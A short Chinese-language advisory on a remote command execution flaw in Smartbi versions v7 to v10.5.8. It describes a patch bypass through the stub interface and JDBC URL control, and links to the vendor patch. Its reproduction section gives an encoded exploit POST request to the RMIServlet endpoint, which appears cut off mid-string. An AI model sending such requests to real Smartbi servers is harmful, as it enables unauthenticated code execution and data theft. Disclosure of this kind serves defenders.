# Smartbi 远程命令执行漏洞

## 漏洞描述

Smartbi 大数据分析平台存在远程命令执行漏洞，未经身份认证的远程攻击者可利用 stub 接口构造请求绕过补丁限制，进而控制 JDBC URL，最终可导致远程代码执行或信息泄露。

## 漏洞影响

```
v7 <= Smartbi <= v10.5.8
```

## 漏洞复现

```
POST /smartbi/vision/RMIServlet?windowUnloading=&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%
```

## 漏洞修复

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://www.smartbi.com.cn/patchinfo